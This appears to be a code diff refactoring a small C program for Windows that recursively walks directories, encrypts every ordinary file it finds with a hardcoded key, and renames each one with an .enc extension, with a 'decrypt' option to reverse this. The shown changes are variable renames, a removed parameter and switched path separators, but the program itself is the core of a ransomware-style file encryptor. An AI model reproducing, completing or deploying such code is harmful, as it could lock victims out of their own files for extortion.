@@ -21,10 +21,10 @@
 #define MODE_ENCRYPT 1
 #define MODE_DECRYPT 0
 
+static int encryption_mode = MODE_ENCRYPT;
 const char* encyption_key = "KEY";
-static int encrypt = 1; // 1 encrypt; 0 decrypt;
 
-void process_file(char* file, int encrypt)
+void process_file(char* file)
 {
     FILE*       fp;
     char*       extension;
@@ -33,7 +33,7 @@ void process_file(char* file, int encrypt)
 
     // Check extension
     extension = strrchr(file, '.');
-    if (encrypt == MODE_ENCRYPT)
+    if (encryption_mode == MODE_ENCRYPT)
     {
         if (!strncmp(extension, ".enc", 4))
         {
@@ -73,7 +73,7 @@ void process_file(char* file, int encrypt)
     free(contents);
     fclose(fp);
 
-    if (encrypt == MODE_ENCRYPT) // Rename the file to .enc
+    if (encryption_mode == MODE_ENCRYPT) // Rename the file to .enc
     {
         size_t size = sizeof(char) * (strlen(file) + 5);
         char* new_file = (char *)malloc(size);
@@ -108,7 +108,7 @@ void walk_dir(char* dir_path)
     char        path[MAX_PATH];
 
     GetFullPathName(dir_path, MAX_PATH, abs_dir_path, NULL);
-    snprintf(wildcard, sizeof(wildcard), "%s\\*", abs_dir_path);
+    snprintf(wildcard, sizeof(wildcard), "%s/*", abs_dir_path);
 
     if ((fHandle = FindFirstFile(wildcard, &findData)) == INVALID_HANDLE_VALUE)
     {
@@ -119,7 +119,7 @@ void walk_dir(char* dir_path)
     {
         if (strncmp(findData.cFileName, ".", 1) && strncmp(findData.cFileName, "..", 2))
         {
-            snprintf(path, MAX_PATH, "%s\\%s", dir_path, findData.cFileName);
+            snprintf(path, MAX_PATH, "%s/%s", dir_path, findData.cFileName);
 
             if ( (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                 !(findData.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)) )
@@ -129,7 +129,7 @@ void walk_dir(char* dir_path)
 
             if (findData.dwFileAttributes & (FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE))
             {
-                process_file(path, encrypt);
+                process_file(path);
             }
 
         }
@@ -147,7 +147,7 @@ int main(int argc, char* argv[])
     {
         if (!strncmp(argv[1], "decrypt", 7))
         {
-            encrypt = 0;
+            encryption_mode = MODE_DECRYPT;
         }
     }
 
